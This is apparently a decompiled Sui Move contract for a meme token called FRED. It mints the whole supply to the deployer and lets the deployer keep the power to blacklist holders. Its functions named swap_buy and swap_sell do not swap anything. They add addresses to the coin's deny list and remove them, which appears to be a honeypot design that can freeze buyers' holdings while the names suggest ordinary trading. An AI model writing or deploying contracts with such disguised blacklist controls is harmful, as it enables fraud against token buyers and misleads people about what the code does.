module 0xd65a9d5202f39437a95585565fe339f0b092c57833f995316f6878ff3db829bd::fred {
    struct FRED has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: FRED, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<FRED>(arg0, 9, b"FRED", b"First Convicted RACCON", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmTC19j44inyueVnQF3wQRG8KSoXCSJB8m5VhhH9BJeURX"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<FRED>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<FRED>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<FRED>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<FRED>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<FRED>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<FRED>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<FRED>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<FRED>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

